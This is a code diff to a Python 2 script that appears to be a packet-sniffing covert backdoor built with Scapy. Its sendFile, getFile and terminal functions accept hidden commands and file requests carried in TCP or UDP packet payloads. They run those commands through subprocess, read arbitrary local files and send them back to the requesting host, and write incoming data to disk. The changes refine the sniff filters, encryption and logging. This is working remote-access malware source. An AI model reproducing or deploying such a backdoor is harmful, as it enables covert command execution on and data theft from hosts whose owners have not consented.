@@ -391,23 +391,29 @@ def commandParser():
 '''
 def sendFile(packet):
 	if packet.haslayer(TCP):
+		print encrypt(packet[Raw].load)
 		with open(packet[Raw].load, "w") as tFile:
 			while True:
-				dPacket = sniff(filter=protocol + " sport " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
+				dPacket = sniff(filter=protocol + " src port " + str(packet[TCP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
 				if len(dPacket) == 0:
 					break
-				if "F" in dPacket[0][TCP].flags:
+				if dPacket[0].haslayer(Raw) != True:
+					continue
+				if dPacket[0][TCP].flags == 1:
 					break
-				tFile.write(dPacket[Raw].load)
+				tFile.write(encrypt(dPacket[0][Raw].load))
 	elif packet.haslayer(UDP):
 		with open(packet[Raw].load, "w") as tFile:
 			while True:
-				dPacket = sniff(filter=protocol + " sport " + str(packet[UDP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
+				dPacket = sniff(filter=protocol + " src port " + str(packet[UDP].sport) + " and ip src " + packet[IP].src, count=1, timeout=30)
 				if len(dPacket) == 0:
 					break
-				if "F" in dPacket[0][UDP].flags:
+				if dPacket[0][UDP].sport == 0:
 					break
-				tFile.write(dPacket[Raw].load)
+				tFile.write(encrypt(dPacket[0][Raw].load))
+	if len(logFile) > 0:
+		with open(logFile, "a") as serverLog:
+			serverLog.write(packet[Raw].load + " received from " + packet[IP].src + " at " + time.ctime() + "\n")
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -433,7 +439,7 @@ def getFile(packet):
 	if packet.haslayer(TCP):
 		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
 			      TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=random.randint(0, 16777215))/\
-			      Raw(LOAD="")
+			      Raw(load="")
 		with open(packet[Raw].load, "r") as tFile:
 			for line in tFile:
 				dPacket[IP].id = dPacket[IP].id + 1
@@ -448,7 +454,7 @@ def getFile(packet):
 	elif packet.haslayer(UDP):
 		dPacket = IP(dst=packet[IP].src, id=random.randint(0, 65535))/\
 			      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/\
-			      Raw(LOAD="")
+			      Raw(load="")
 		with open(packet[Raw].load, "r") as tFile:
 			for line in tFile:
 				dPacket[IP].id = dPacket[IP].id + 1
@@ -481,7 +487,6 @@ def getFile(packet):
 '''
 def terminal(packet):
 	output = encrypt(subprocess.check_output(packet[Raw].load.split(), stderr=subprocess.STDOUT))
-	print output
 	if packet.haslayer(TCP):
 		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
 			            TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)
